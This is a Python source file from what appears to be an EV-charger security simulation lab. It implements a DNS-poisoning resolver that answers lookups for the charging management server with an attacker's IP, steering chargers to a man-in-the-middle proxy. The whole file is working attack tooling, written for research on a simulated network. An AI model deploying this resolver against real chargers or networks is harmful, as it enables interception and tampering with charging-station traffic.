"""
===========================================================================
EVSecSim — DNS Redirection Primitive for the External (WAN) MITM
===========================================================================

WHAT THIS IS
------------
A tiny authoritative-ish DNS server that supplies the *interception
primitive* the external MITM (Attack 3b) previously lacked.  Instead of
the EVSE being hard-configured with the attacker's address, the EVSE is
configured with the REAL CSMS hostname (e.g. csms.cpo.sg) and asks this
resolver to look it up.  In POISON mode the resolver lies, returning the
attacker's IP; in HONEST mode it returns the real CSMS IP.

This relocates the trust assumption from the indefensible
  "the victim's config points at the attacker"
to the defensible
  "the attacker controls the EVSE's name resolution"
— the real-world vector for a charger on a rogue 4G SIM DNS, a
compromised site gateway, or a DoT/DoH downgrade.

The KEY EVIDENCE of the fix: the EVSE launch command is byte-identical in
the benign and attack runs (--url ws://csms.cpo.sg:9000 in both).  Only
the DNS answer differs.  The charger is never reconfigured.

BEHAVIOUR
---------
  A query for TARGET_HOST  ->  answered locally with ANSWER_IP
                               (attacker IP in POISON, real CSMS in HONEST)
  Any other query          ->  forwarded to UPSTREAM_DNS (Docker's embedded
                               resolver 127.0.0.11) so container-name
                               resolution keeps working.

ENVIRONMENT
-----------
  TARGET_HOST   hostname to intercept           (default csms.cpo.sg)
  ANSWER_IP     IP returned for TARGET_HOST      (required)
  MODE          POISON | HONEST  (logging label) (default POISON)
  UPSTREAM_DNS  passthrough resolver             (default 127.0.0.11)
  TTL           answer TTL seconds               (default 30)
  BIND_ADDR / BIND_PORT                          (default 0.0.0.0 / 53)
===========================================================================
"""

import os
import sys
from datetime import datetime

from dnslib import RR, QTYPE, A, RCODE
from dnslib.dns import DNSRecord
from dnslib.server import DNSServer, BaseResolver

TARGET_HOST  = os.environ.get("TARGET_HOST", "csms.cpo.sg").rstrip(".").lower()
ANSWER_IP    = os.environ.get("ANSWER_IP", "172.20.0.33")
MODE         = os.environ.get("MODE", "POISON").upper()
UPSTREAM_DNS = os.environ.get("UPSTREAM_DNS", "127.0.0.11")
TTL          = int(os.environ.get("TTL", "30"))
BIND_ADDR    = os.environ.get("BIND_ADDR", "0.0.0.0")
BIND_PORT    = int(os.environ.get("BIND_PORT", "53"))

RED, GREEN, CYAN, BOLD, RESET = "\033[91m", "\033[92m", "\033[96m", "\033[1m", "\033[0m"


def ts():
    return datetime.now().strftime("%H:%M:%S")


class RedirectResolver(BaseResolver):
    """Answer TARGET_HOST locally; forward everything else upstream."""

    def resolve(self, request, handler):
        qname = str(request.q.qname).rstrip(".").lower()
        qtype = QTYPE[request.q.qtype]
        reply = request.reply()

        if qname == TARGET_HOST and qtype in ("A", "ANY"):
            reply.add_answer(RR(request.q.qname, QTYPE.A, rdata=A(ANSWER_IP), ttl=TTL))
            if MODE == "POISON":
                print(f"{RED}[DNS {ts()}] FORGED  {qname} A -> {ANSWER_IP}  "
                      f"(attacker — EVSE will dial the MITM proxy){RESET}", flush=True)
            else:
                print(f"{GREEN}[DNS {ts()}] honest  {qname} A -> {ANSWER_IP}  "
                      f"(real CSMS){RESET}", flush=True)
            return reply

        # passthrough so Docker service names (e.g. 'csms') still resolve
        try:
            proxied = DNSRecord.parse(request.send(UPSTREAM_DNS, 53, timeout=5))
            print(f"[DNS {ts()}] forwarded {qname} {qtype} -> upstream {UPSTREAM_DNS}",
                  flush=True)
            return proxied
        except Exception as exc:
            print(f"[DNS {ts()}] upstream error for {qname}: {exc}", flush=True)
            reply.header.rcode = RCODE.SERVFAIL
            return reply


def main():
    tag = f"{RED}POISON{RESET}" if MODE == "POISON" else f"{GREEN}HONEST{RESET}"
    print(f"\n{BOLD}{CYAN}{'='*62}{RESET}")
    print(f"{BOLD}{CYAN}  EVSecSim — DNS redirection resolver ({MODE}){RESET}")
    print(f"{BOLD}{CYAN}{'='*62}{RESET}")
    print(f"  Mode          : {tag}")
    print(f"  Intercepting  : {TARGET_HOST}  ->  {ANSWER_IP}")
    print(f"  Passthrough   : all other names -> {UPSTREAM_DNS}")
    print(f"  Listening     : {BIND_ADDR}:{BIND_PORT} (UDP)")
    print(f"{BOLD}{CYAN}{'='*62}{RESET}\n", flush=True)

    server = DNSServer(RedirectResolver(), port=BIND_PORT, address=BIND_ADDR)
    try:
        server.start()
    except KeyboardInterrupt:
        sys.exit(0)


if __name__ == "__main__":
    main()
